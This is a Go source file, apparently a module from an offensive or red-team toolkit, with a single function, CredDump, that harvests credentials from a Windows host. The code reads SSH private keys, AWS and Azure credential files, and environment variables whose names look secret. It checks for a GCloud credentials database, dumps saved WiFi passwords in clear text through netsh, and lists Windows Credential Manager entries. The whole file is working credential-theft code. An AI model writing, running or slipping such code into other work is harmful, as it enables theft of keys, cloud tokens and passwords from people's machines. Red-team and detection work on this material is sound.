package ttp

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// CredDump collects credential material from a Windows host (TTP 7 / TTP 41).
func CredDump() (string, error) {
	var sb strings.Builder
	profile := os.Getenv("USERPROFILE")

	// SSH private keys
	sb.WriteString("=== SSH keys ===\n")
	sshDir := filepath.Join(profile, ".ssh")
	entries, _ := filepath.Glob(filepath.Join(sshDir, "id_*"))
	for _, kf := range entries {
		if strings.HasSuffix(kf, ".pub") {
			continue
		}
		if data, err := os.ReadFile(kf); err == nil {
			sb.WriteString(fmt.Sprintf("--- %s ---\n", kf))
			sb.Write(data)
			sb.WriteString("\n")
		}
	}
	if data, err := os.ReadFile(filepath.Join(sshDir, "known_hosts")); err == nil {
		sb.WriteString("--- known_hosts ---\n")
		sb.Write(data)
		sb.WriteString("\n")
	}

	// AWS credentials
	sb.WriteString("=== AWS credentials ===\n")
	awsDir := filepath.Join(profile, ".aws")
	for _, name := range []string{"credentials", "config"} {
		if data, err := os.ReadFile(filepath.Join(awsDir, name)); err == nil {
			sb.WriteString(fmt.Sprintf("--- .aws/%s ---\n", name))
			sb.Write(data)
			sb.WriteString("\n")
		}
	}

	// GCloud credentials
	gcloudCreds := filepath.Join(profile, `AppData\Roaming\gcloud\credentials.db`)
	if _, err := os.Stat(gcloudCreds); err == nil {
		sb.WriteString("=== GCloud credentials file present ===\n")
		sb.WriteString(gcloudCreds + "\n")
	}

	// Azure credentials
	azureDir := filepath.Join(profile, ".azure")
	if data, err := os.ReadFile(filepath.Join(azureDir, "accessTokens.json")); err == nil {
		sb.WriteString("=== Azure tokens ===\n")
		sb.Write(data)
		sb.WriteString("\n")
	}

	// Environment variable secrets
	sb.WriteString("=== Environment secrets ===\n")
	patterns := []string{"KEY", "SECRET", "TOKEN", "PASS", "PWD", "API", "CRED", "AZURE", "AWS", "GCP"}
	found := 0
	for _, v := range os.Environ() {
		upper := strings.ToUpper(v)
		for _, p := range patterns {
			if strings.Contains(upper, p) {
				sb.WriteString(v + "\n")
				found++
				break
			}
		}
	}
	if found == 0 {
		sb.WriteString("(none found)\n")
	}

	// WiFi profiles (requires admin for key=clear)
	sb.WriteString("\n=== WiFi profiles ===\n")
	if out, err := exec.Command("netsh", "wlan", "show", "profiles").Output(); err == nil {
		sb.Write(out)
		// Extract profile names and dump keys
		for _, line := range strings.Split(string(out), "\n") {
			if !strings.Contains(line, ": ") {
				continue
			}
			parts := strings.SplitN(line, ": ", 2)
			if len(parts) != 2 {
				continue
			}
			name := strings.TrimSpace(parts[1])
			if name == "" {
				continue
			}
			keyOut, err := exec.Command("netsh", "wlan", "show", "profile",
				"name="+name, "key=clear").Output()
			if err == nil {
				sb.WriteString(fmt.Sprintf("--- profile: %s ---\n", name))
				sb.Write(keyOut)
				sb.WriteString("\n")
			}
		}
	} else {
		sb.WriteString("(netsh unavailable or no wireless adapter)\n")
	}

	// Windows Credential Manager dump via cmdkey
	sb.WriteString("\n=== Credential Manager ===\n")
	if out, err := exec.Command("cmdkey", "/list").Output(); err == nil {
		sb.Write(out)
	} else {
		sb.WriteString("(cmdkey unavailable)\n")
	}

	result := sb.String()
	if len(result) > 16384 {
		result = result[:16384] + "\n...(truncated)"
	}
	return result, nil
}
